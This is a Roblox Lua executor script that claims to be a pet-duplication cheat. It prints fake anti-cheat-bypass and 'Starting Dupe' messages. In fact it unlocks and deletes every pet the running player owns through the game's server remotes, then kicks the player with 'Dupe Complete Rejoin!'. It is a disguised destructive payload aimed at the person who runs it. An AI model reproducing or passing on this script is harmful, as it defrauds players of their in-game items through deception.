if getthreadcontext() > 7 then
	print("Bypassing Anti Cheat Checks...")
	task.wait(0.5)
	print("Blocking Data Request...")
	print("Starting Dupe")
	local replicated_storage = game:GetService("ReplicatedStorage")
	local local_player = game:GetService("Players").LocalPlayer
	local stats = require(replicated_storage.Shared.Utils.Stats.StatsUtil)
	local remote = require(replicated_storage.Shared.Framework.Network.Remote)
	local local_data = require(replicated_storage.Client.Framework.Services.LocalData)
	local data = local_data:Get()
	local ids = {}
	for _, v in next, data.Pets do
		remote:FireServer("UnlockPet", v.Id, false)
		remote:FireServer("DeletePet", v.Id, 10, false)
		table.insert(ids, v.Id)
		local args = {
			[1] = "MultiDeletePets",
			[2] = ids
		}
		remote:FireServer(unpack(args))	
		task.wait(0.1)
	end
	local_player:Kick("Dupe Complete Rejoin!")
else
	game:GetService("Players").LocalPlayer:Kick("Executor Not Supported")
end
